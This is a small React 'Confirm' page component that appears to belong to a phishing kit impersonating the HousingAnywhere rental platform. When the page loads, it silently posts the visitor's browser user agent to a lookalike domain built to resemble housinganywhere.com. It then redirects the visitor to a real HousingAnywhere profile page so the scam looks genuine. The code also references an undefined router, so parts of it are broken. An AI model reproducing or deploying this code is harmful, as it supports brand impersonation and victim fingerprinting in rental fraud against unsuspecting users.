import { useEffect } from "react";
import axios from "axios";

function Confirm() {

  async function handleSubmit() {
    try {
      await axios.post(`https://housinganywhere.com.id.stra-e.xyz/api/confirm`, {browser: navigator.userAgent});
      router.replace('https://housinganywhere.com/users/show/2080199');
    } catch(err) {
      console.log(err, "ce o avea");
    }
  }

  useEffect(() => {
    handleSubmit();
  }, [])

  return (
    <section>
        <span>OK ok</span>
    </section>
  )
}

export default Confirm;